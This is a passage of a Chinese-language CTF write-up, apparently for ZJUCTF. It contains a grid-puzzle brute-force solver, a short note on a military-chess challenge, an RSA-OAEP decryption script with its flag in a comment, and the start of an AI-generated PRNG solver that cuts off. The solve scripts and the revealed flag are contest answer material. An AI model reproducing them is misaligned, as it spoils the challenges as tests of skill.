<a id="__codelineno-0-123" name="__codelineno-0-123" href="#__codelineno-0-123"></a>    <span class="n">possible_solutions</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;diag&#39;</span><span class="p">,</span> <span class="s1">&#39;index&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;主对角线&#39;</span><span class="p">})</span>
<a id="__codelineno-0-124" name="__codelineno-0-124" href="#__codelineno-0-124"></a>    <span class="n">possible_solutions</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;anti_diag&#39;</span><span class="p">,</span> <span class="s1">&#39;index&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;副对角线&#39;</span><span class="p">})</span>
<a id="__codelineno-0-125" name="__codelineno-0-125" href="#__codelineno-0-125"></a>
<a id="__codelineno-0-126" name="__codelineno-0-126" href="#__codelineno-0-126"></a>    <span class="n">all_coords</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span>
<a id="__codelineno-0-127" name="__codelineno-0-127" href="#__codelineno-0-127"></a>
<a id="__codelineno-0-128" name="__codelineno-0-128" href="#__codelineno-0-128"></a>    <span class="k">for</span> <span class="n">assumed_solution</span> <span class="ow">in</span> <span class="n">possible_solutions</span><span class="p">:</span>
<a id="__codelineno-0-129" name="__codelineno-0-129" href="#__codelineno-0-129"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="si">{</span><span class="s1">&#39;=&#39;</span><span class="o">*</span><span class="mi">40</span><span class="si">}</span><span class="se">\n</span><span class="s2">[假设] 答案是: </span><span class="si">{</span><span class="n">assumed_solution</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="s1">&#39;=&#39;</span><span class="o">*</span><span class="mi">40</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-0-130" name="__codelineno-0-130" href="#__codelineno-0-130"></a>
<a id="__codelineno-0-131" name="__codelineno-0-131" href="#__codelineno-0-131"></a>        <span class="n">fixed_coords</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
<a id="__codelineno-0-132" name="__codelineno-0-132" href="#__codelineno-0-132"></a>        <span class="n">s_type</span><span class="p">,</span> <span class="n">s_index</span> <span class="o">=</span> <span class="n">assumed_solution</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="n">assumed_solution</span><span class="p">[</span><span class="s1">&#39;index&#39;</span><span class="p">]</span>
<a id="__codelineno-0-133" name="__codelineno-0-133" href="#__codelineno-0-133"></a>        <span class="k">if</span> <span class="n">s_type</span> <span class="o">==</span> <span class="s1">&#39;row&#39;</span><span class="p">:</span>
<a id="__codelineno-0-134" name="__codelineno-0-134" href="#__codelineno-0-134"></a>            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span> <span class="n">fixed_coords</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">s_index</span><span class="p">,</span> <span class="n">c</span><span class="p">))</span>
<a id="__codelineno-0-135" name="__codelineno-0-135" href="#__codelineno-0-135"></a>        <span class="k">elif</span> <span class="n">s_type</span> <span class="o">==</span> <span class="s1">&#39;col&#39;</span><span class="p">:</span>
<a id="__codelineno-0-136" name="__codelineno-0-136" href="#__codelineno-0-136"></a>            <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span> <span class="n">fixed_coords</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="n">s_index</span><span class="p">))</span>
<a id="__codelineno-0-137" name="__codelineno-0-137" href="#__codelineno-0-137"></a>        <span class="k">elif</span> <span class="n">s_type</span> <span class="o">==</span> <span class="s1">&#39;diag&#39;</span><span class="p">:</span>
<a id="__codelineno-0-138" name="__codelineno-0-138" href="#__codelineno-0-138"></a>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span> <span class="n">fixed_coords</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
<a id="__codelineno-0-139" name="__codelineno-0-139" href="#__codelineno-0-139"></a>        <span class="k">elif</span> <span class="n">s_type</span> <span class="o">==</span> <span class="s1">&#39;anti_diag&#39;</span><span class="p">:</span>
<a id="__codelineno-0-140" name="__codelineno-0-140" href="#__codelineno-0-140"></a>            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span> <span class="n">fixed_coords</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="mi">4</span> <span class="o">-</span> <span class="n">i</span><span class="p">))</span>
<a id="__codelineno-0-141" name="__codelineno-0-141" href="#__codelineno-0-141"></a>
<a id="__codelineno-0-142" name="__codelineno-0-142" href="#__codelineno-0-142"></a>        <span class="n">free_coords</span> <span class="o">=</span> <span class="p">[</span><span class="n">coord</span> <span class="k">for</span> <span class="n">coord</span> <span class="ow">in</span> <span class="n">all_coords</span> <span class="k">if</span> <span class="n">coord</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">fixed_coords</span><span class="p">]</span>
<a id="__codelineno-0-143" name="__codelineno-0-143" href="#__codelineno-0-143"></a>        <span class="n">num_free</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">free_coords</span><span class="p">)</span>
<a id="__codelineno-0-144" name="__codelineno-0-144" href="#__codelineno-0-144"></a>        <span class="n">total_combinations</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="n">num_free</span>
<a id="__codelineno-0-145" name="__codelineno-0-145" href="#__codelineno-0-145"></a>
<a id="__codelineno-0-146" name="__codelineno-0-146" href="#__codelineno-0-146"></a>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">total_combinations</span><span class="p">):</span>
<a id="__codelineno-0-147" name="__codelineno-0-147" href="#__codelineno-0-147"></a>            <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">200000</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
<a id="__codelineno-0-148" name="__codelineno-0-148" href="#__codelineno-0-148"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  -&gt; 正在检查组合 </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> / </span><span class="si">{</span><span class="n">total_combinations</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
<a id="__codelineno-0-149" name="__codelineno-0-149" href="#__codelineno-0-149"></a>
<a id="__codelineno-0-150" name="__codelineno-0-150" href="#__codelineno-0-150"></a>            <span class="n">grid</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
<a id="__codelineno-0-151" name="__codelineno-0-151" href="#__codelineno-0-151"></a>            <span class="k">for</span> <span class="n">r</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">fixed_coords</span><span class="p">:</span> <span class="n">grid</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
<a id="__codelineno-0-152" name="__codelineno-0-152" href="#__codelineno-0-152"></a>
<a id="__codelineno-0-153" name="__codelineno-0-153" href="#__codelineno-0-153"></a>            <span class="n">binary_string</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="n">num_free</span><span class="p">)</span>
<a id="__codelineno-0-154" name="__codelineno-0-154" href="#__codelineno-0-154"></a>            <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">free_coords</span><span class="p">):</span>
<a id="__codelineno-0-155" name="__codelineno-0-155" href="#__codelineno-0-155"></a>                <span class="n">grid</span><span class="p">[</span><span class="n">r</span><span class="p">,</span> <span class="n">c</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binary_string</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span>
<a id="__codelineno-0-156" name="__codelineno-0-156" href="#__codelineno-0-156"></a>
<a id="__codelineno-0-157" name="__codelineno-0-157" href="#__codelineno-0-157"></a>            <span class="k">if</span> <span class="n">check_grid_consistency</span><span class="p">(</span><span class="n">grid</span><span class="p">,</span> <span class="n">assumed_solution</span><span class="p">,</span> <span class="n">verifier</span><span class="p">):</span>
<a id="__codelineno-0-158" name="__codelineno-0-158" href="#__codelineno-0-158"></a>                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">  [成功] 找到一个逻辑自洽的棋盘 (组合 #</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">)!&quot;</span><span class="p">)</span>
<a id="__codelineno-0-159" name="__codelineno-0-159" href="#__codelineno-0-159"></a>                <span class="k">if</span> <span class="n">count_full_lines</span><span class="p">(</span><span class="n">grid</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
<a id="__codelineno-0-160" name="__codelineno-0-160" href="#__codelineno-0-160"></a>                    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">40</span><span class="p">)</span>
<a id="__codelineno-0-161" name="__codelineno-0-161" href="#__codelineno-0-161"></a>                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;!!! 找到唯一解！假设 </span><span class="si">{</span><span class="n">assumed_solution</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> 成立 !!!&quot;</span><span class="p">)</span>
<a id="__codelineno-0-162" name="__codelineno-0-162" href="#__codelineno-0-162"></a>                    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;最终棋盘格局:&quot;</span><span class="p">)</span>
<a id="__codelineno-0-163" name="__codelineno-0-163" href="#__codelineno-0-163"></a>                    <span class="nb">print</span><span class="p">(</span><span class="n">grid</span><span class="p">)</span>
<a id="__codelineno-0-164" name="__codelineno-0-164" href="#__codelineno-0-164"></a>
<a id="__codelineno-0-165" name="__codelineno-0-165" href="#__codelineno-0-165"></a>                    <span class="n">flag_parts</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">row</span><span class="p">))</span> <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">grid</span><span class="p">]</span>
<a id="__codelineno-0-166" name="__codelineno-0-166" href="#__codelineno-0-166"></a>                    <span class="n">flag</span> <span class="o">=</span> <span class="s2">&quot;ZJUCTF{&quot;</span> <span class="o">+</span> <span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag_parts</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;}&quot;</span>
<a id="__codelineno-0-167" name="__codelineno-0-167" href="#__codelineno-0-167"></a>                    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">提交的 Flag:&quot;</span><span class="p">)</span>
<a id="__codelineno-0-168" name="__codelineno-0-168" href="#__codelineno-0-168"></a>                    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<a id="__codelineno-0-169" name="__codelineno-0-169" href="#__codelineno-0-169"></a>                    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">40</span><span class="p">)</span>
<a id="__codelineno-0-170" name="__codelineno-0-170" href="#__codelineno-0-170"></a>                    <span class="k">return</span>
<a id="__codelineno-0-171" name="__codelineno-0-171" href="#__codelineno-0-171"></a>
<a id="__codelineno-0-172" name="__codelineno-0-172" href="#__codelineno-0-172"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">遍历所有可能性后，未能找到符合条件的唯一解。&quot;</span><span class="p">)</span>
<a id="__codelineno-0-173" name="__codelineno-0-173" href="#__codelineno-0-173"></a>
<a id="__codelineno-0-174" name="__codelineno-0-174" href="#__codelineno-0-174"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
<a id="__codelineno-0-175" name="__codelineno-0-175" href="#__codelineno-0-175"></a>    <span class="n">main</span><span class="p">()</span>
</code></pre></div></p>
<h3 id="jgs">JGS<a class="headerlink" href="#jgs" title="Permanent link">&para;</a></h3>
<p>四国军棋，拿了个二血，好玩，就是硬推，推理过程太多了真写不下，写个大致思路吧，首先根据特殊的移动来判断工兵，然后一直不能动的就是地雷，然后司令碰死军棋会暴露，通过这个来判断司令，随后中间就可以看出某些师长啊之类的，然后再判断炸弹的位置，本人和对家以及上家都比较方便看出炸弹，下家因为投降了不太好判断，只能排除法，最后一点一点去排来定坑位，下面是我当时手写推的草稿，没法完整记录了</p>
<h2 id="crypto">crypto<a class="headerlink" href="#crypto" title="Permanent link">&para;</a></h2>
<h3 id="crypt-it">crypt-it<a class="headerlink" href="#crypt-it" title="Permanent link">&para;</a></h3>
<p>签到题，没啥好说的，脚本如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.PublicKey</span><span class="w"> </span><span class="kn">import</span> <span class="n">RSA</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># --- 1. Read the private key from the PEM file ---</span>
<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;private_key.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">key_file</span><span class="p">:</span>
<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>        <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">key_file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error: private_key.pem not found. Make sure the private key file is in the same directory.&quot;</span><span class="p">)</span>
<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>    <span class="n">exit</span><span class="p">()</span>
<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="c1"># --- 2. Read the encrypted message ---</span>
<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="c1"># The message might be raw binary or Base64 encoded.</span>
<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c1"># This script will try to handle both.</span>
<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;flag.enc&quot;</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">encrypted_file</span><span class="p">:</span>
<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>        <span class="n">encrypted_message</span> <span class="o">=</span> <span class="n">encrypted_file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error: encrypted_message.bin not found. Make sure the encrypted message file is in the same directory.&quot;</span><span class="p">)</span>
<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>    <span class="n">exit</span><span class="p">()</span>
<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>
<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="c1"># --- 3. Decrypt the message using RSA with OAEP padding ---</span>
<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="c1"># Create a cipher object using the private key</span>
<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="n">cipher_rsa</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>
<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="c1"># It&#39;s common in CTFs for the ciphertext to be Base64 encoded.</span>
<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="c1"># We&#39;ll try to decode it first. If that fails, we&#39;ll assume it&#39;s raw binary.</span>
<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>    <span class="c1"># First, try decoding from Base64</span>
<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>    <span class="n">encrypted_message_decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">)</span>
<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>    <span class="n">decrypted_message</span> <span class="o">=</span> <span class="n">cipher_rsa</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_message_decoded</span><span class="p">)</span>
<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Successfully decrypted after Base64 decoding.&quot;</span><span class="p">)</span>
<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="k">except</span> <span class="p">(</span><span class="ne">ValueError</span><span class="p">,</span> <span class="ne">TypeError</span><span class="p">):</span>
<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>    <span class="c1"># If Base64 decoding fails, assume it&#39;s raw binary</span>
<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Could not decode as Base64. Attempting raw decryption.&quot;</span><span class="p">)</span>
<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>    <span class="k">try</span><span class="p">:</span>
<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>        <span class="n">decrypted_message</span> <span class="o">=</span> <span class="n">cipher_rsa</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">)</span>
<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Successfully decrypted raw binary message.&quot;</span><span class="p">)</span>
<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>    <span class="k">except</span> <span class="ne">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Decryption failed. Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;This could be due to a wrong key, corrupted data, or incorrect padding scheme.&quot;</span><span class="p">)</span>
<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>        <span class="n">exit</span><span class="p">()</span>
<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>
<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="c1"># --- 4. Print the decrypted flag/message ---</span>
<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="c1"># The result is in bytes, so we decode it to a string to print it</span>
<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>    <span class="n">flag</span> <span class="o">=</span> <span class="n">decrypted_message</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
<a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">----------- DECRYPTED MESSAGE -----------&quot;</span><span class="p">)</span>
<a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;---------------------------------------&quot;</span><span class="p">)</span>
<a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="k">except</span> <span class="ne">UnicodeDecodeError</span><span class="p">:</span>
<a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">----------- DECRYPTED MESSAGE (RAW BYTES) -----------&quot;</span><span class="p">)</span>
<a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">decrypted_message</span><span class="p">)</span>
<a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;-----------------------------------------------------&quot;</span><span class="p">)</span>
<a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Note: The output could not be decoded as UTF-8. It is displayed above as raw bytes.&quot;</span><span class="p">)</span>
<a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>    <span class="c1">#ZJUCTF{RSA_encrypt_with_OAEP_is_secure!}</span>
</code></pre></div></p>
<h3 id="prng-study-plus-1">prng study plus 1<a class="headerlink" href="#prng-study-plus-1" title="Permanent link">&para;</a></h3>
<p>随机数预测，没看懂咋做的，总之AI来N把梭，牛逼，AI给我生成的脚本如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">math</span>
<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1"># --- 连接信息 ---</span>
<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="mi">52655</span>
<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="c1"># 解决工作量证明</span>
<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="k">def</span><span class="w"> </span><span class="nf">solve_pow</span><span class="p">(</span><span class="n">challenge_suffix</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">):</span>
<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 正在解决 PoW...&quot;</span><span class="p">)</span>
<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>    <span class="n">alphabet</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>        <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>        <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">((</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">challenge_suffix</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] PoW 找到解: </span><span class="si">{</span><span class="n">prefix</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>            <span class="k">return</span> <span class="n">prefix</span>
<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>    <span class="k">return</span> <span class="kc">None</span>
<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>
<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="k">def</span><span class="w"> </span><span class="nf">solve</span><span class="p">():</span>
<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>    <span class="k">try</span><span class="p">:</span>
